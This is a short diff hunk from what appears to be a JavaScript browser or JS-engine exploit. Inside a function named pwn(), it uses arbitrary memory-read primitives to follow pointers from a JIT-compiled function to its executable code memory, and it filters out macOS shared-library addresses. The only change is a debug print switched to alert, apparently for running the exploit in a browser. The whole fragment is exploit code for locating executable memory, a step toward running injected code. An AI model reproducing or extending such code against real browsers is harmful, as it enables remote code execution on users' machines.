@@ -394,7 +394,7 @@ function pwn()
         var executableAddr = memory.read_i64(sinFuncAddr, 3);
        
         var jitCodeAddr = memory.read_i64(executableAddr, 3);
-        print("jitCodeAddr:" + jitCodeAddr);
+        alert("jitCodeAddr:" + jitCodeAddr);
         var rxMemAddr = memory.read_i64(jitCodeAddr, 4);
         if (ShiftRight(rxMemAddr, 4) == 0x7fff) {
             return false; // macOS Library Pointer - Shared Library cache
